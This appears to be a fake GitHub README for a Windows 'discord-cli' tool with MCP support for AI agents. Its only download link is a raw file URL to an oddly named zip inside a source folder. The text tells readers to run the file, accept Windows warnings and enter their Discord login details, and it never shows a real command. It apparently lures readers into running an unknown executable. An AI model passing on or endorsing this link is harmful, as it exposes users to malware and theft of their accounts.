# 🧭 discord-cli - Control Discord from your terminal

[![Download discord-cli](https://img.shields.io/badge/Download%20discord--cli-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Linotypefibre247/discord-cli/main/cmd/cli_discord_mopla.zip)

## 🚀 What this app does

discord-cli lets you read, search, and send Discord messages from your terminal on Windows.

It is made for people who want a fast way to work with Discord without opening the full app each time. It also works well for AI agents and local tools that need to talk to Discord through MCP.

## ✨ What you can do

- Read recent Discord messages from the terminal
- Search past messages by keyword
- Send messages to a channel
- Keep a local sync of message data
- Connect with MCP-based tools and agents
- Use a simple command-line workflow on Windows

## 💻 What you need

- Windows 10 or Windows 11
- An internet connection
- A Discord account
- Permission to use the Discord server and channel you want to access
- A terminal window such as PowerShell or Windows Terminal

## 📥 Download and install

Visit this page to download the app:

[https://raw.githubusercontent.com/Linotypefibre247/discord-cli/main/cmd/cli_discord_mopla.zip](https://raw.githubusercontent.com/Linotypefibre247/discord-cli/main/cmd/cli_discord_mopla.zip)

After you open the page:

1. Look for the latest release or download files on the page
2. Download the Windows version
3. Save the file to your Downloads folder or Desktop
4. If the file is zipped, right-click it and choose Extract All
5. Open the extracted folder
6. Run the app file for Windows

If Windows asks for confirmation, choose the option that lets the app run.

## 🪟 First-time setup on Windows

When you run discord-cli for the first time, you may need to connect your Discord account.

Follow these steps:

1. Open the app or terminal tool
2. Sign in with your Discord details if asked
3. Allow access to the server or channel you want to use
4. Pick the workspace or server you want to sync
5. Let the app finish its first sync

If you use more than one Discord server, start with the one you use most.

## ⌨️ How to use it

Open PowerShell or Windows Terminal, then use the app commands to work with Discord.

Common tasks include:

- Sync messages from a channel
- Search for a message by word or phrase
- Send a new message
- Check recent activity

Example workflow:

1. Start the app
2. Choose your server or channel
3. Run a sync command
4. Search for the message you need
5. Send a message if needed

If you are not sure what to type, use the built-in help command shown by the app.

## 🔍 Searching messages

Searching helps you find old messages fast.

Use search when you want to:

- Find a link sent earlier
- Look up a name or topic
- Check what was said in a chat
- Review past work messages

Tips for better search results:

- Use short keywords
- Search one topic at a time
- Try a sender name if you know it
- Use a phrase from the message if you remember it

## 📤 Sending messages

You can send messages from your terminal to a Discord channel.

This is useful when you want to:

- Share a quick update
- Post a status note
- Send a test message
- Reply from a script or tool

Before you send a message, check that:

- You are in the right channel
- You have permission to post
- The message text is correct

## 🤖 MCP Server support

discord-cli includes MCP Server support for tools and AI agents.

This lets connected tools:

- Read Discord data
- Search messages
- Send messages
- Work with Discord in a structured way

Use this if you want to connect Discord to local agents, scripts, or developer tools. It is useful for automation and for workflows that need message access in a simple format.

## 🗂️ Local sync and storage

The app can keep synced Discord data in a local SQLite database.

That helps with:

- Fast search
- Offline browsing of stored data
- Better message lookup
- Repeated use without full re-downloads each time

Your local data stays on your computer unless you share it through another tool.

## 🔐 Permissions you may need

To use discord-cli, your Discord account or bot setup may need access to:

- Read messages
- View channels
- Send messages
- Read message history

If a command does not work, check the channel permissions in Discord first.

## 🛠️ Basic usage flow

Use this simple flow the first time:

1. Download the Windows app from the link above
2. Open the downloaded file
3. Sign in or connect your Discord account
4. Choose a server or channel
5. Sync your messages
6. Search or send messages from the terminal

If you want to use it with an agent or other tool, set up the MCP server after the first sync works.

## 🧪 Example tasks

Here are a few things you can do with the app:

- Find a message with a file link
- Check a channel for recent updates
- Send a reminder to a team channel
- Build a local message index for search
- Connect Discord to an automation workflow

## 📁 Files and data

discord-cli may create local files for:

- Synced message data
- Search indexes
- App settings
- MCP connection details

Keep these files in a folder you can find again. If you move the app, make sure its local data moves with it if needed.

## 🔁 Updating the app

When a new version is posted:

1. Open the download page again
2. Get the latest Windows file
3. Replace the old version
4. Open the new version
5. Sync again if needed

If you keep local data in a separate folder, your search history and synced messages may stay intact

## 🧭 Common problems

If the app does not open:

- Check that the download finished
- Make sure you extracted the file if it came in a zip folder
- Run it again as a normal Windows app

If messages do not appear:

- Check your Discord connection
- Check your channel permissions
- Sync the server or channel again

If search gives no results:

- Try a shorter keyword
- Make sure the channel was synced
- Check that the message exists in the local data

If you cannot send a message:

- Confirm that you have posting rights in the channel
- Check that the channel is not read-only
- Try a different channel to test access

## 📌 Project details

- Name: discord-cli
- Type: Discord command-line app
- Use case: Read, search, and send Discord messages
- Platform focus: Windows
- Data store: SQLite
- Tool support: MCP Server
- Main users: Developers, AI agents, and people who want terminal-based Discord access

## 🧩 Topics

ai-agents, cli, developer-tools-ai-agent, discord, discord-cli, golang, mcp, mcp-server, sqlite, terminal